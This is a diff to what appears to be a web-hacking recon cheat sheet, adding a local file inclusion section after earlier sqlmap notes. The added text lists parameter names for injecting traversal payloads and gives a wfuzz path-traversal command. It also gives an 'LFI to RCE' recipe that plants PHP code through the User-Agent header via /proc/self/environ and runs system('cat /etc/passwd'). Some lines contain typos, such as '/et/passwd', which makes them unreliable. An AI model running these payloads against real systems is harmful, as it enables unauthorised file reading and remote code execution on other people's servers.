@@ -3,7 +3,8 @@
 - [recon step 1 ](#recon)
 - 
 - [automatic scan](#automatic).
- --[sql scan  ](#SqlScan )
+- [sql scan  ](#SqlScan )
+- [lfi] (#lfi).
 
 
 
@@ -354,4 +355,65 @@ sqlmap -r file.txt --risk=3 --level=5 --batch
 *[sqlmapmore](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://medium.com/@cuncis/the-ultimate-sqlmap-tutorial-master-sql-injection-and-vulnerability-assessment-4babdc978e7d&ved=2ahUKEwjMq_DLtu-EAxWoSfEDHdHMCxEQjjh6BAgjEAE&usg=AOvVaw0tXqR_b0UWLkd3QVLl6ddw)
 
 #the end
+
+### lfi
+> best parameters scan url
+```
+?cat={payload}
+?dir={payload}
+?action={payload}
+?board={payload}
+?date={payload}
+?detail={payload}
+?file={payload}
+?download={payload}
+?path={payload}
+?folder={payload}
+?prefix={payload}
+?include={payload}
+?page={payload}
+?inc={payload}
+?locate={payload}
+?show={payload}
+?doc={payload}
+?site={payload}
+?type={payload}
+?view={payload}
+?content={payload}
+?document={payload}
+?layout={payload}
+?mod={payload}
+?conf={payload}
+```
+>next
+```
+cat url.txt|gf lfi |tee a.txt
+```
+>payalod
+```
+/et/passwd
+```
+>tool for scan
+```
+wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
+```
+>[lfi scan ](https://github.com/halohashm79/lfi-scan)
+```
+python lfi.py
+```
+>next
+>tool for php filter and full
+[lfi scan all](https://github.com/Chocapikk/LFIHunt)
+>
+
+>lfi to rce
+> /proc/self/environ
+```
+filename=../../../proc/self/environ HTTP/1.1
+User-Agent: <?=phpinfo(); ?>
+..
+<?php system('cat /etc/passwd');?>
+```
+
+
 
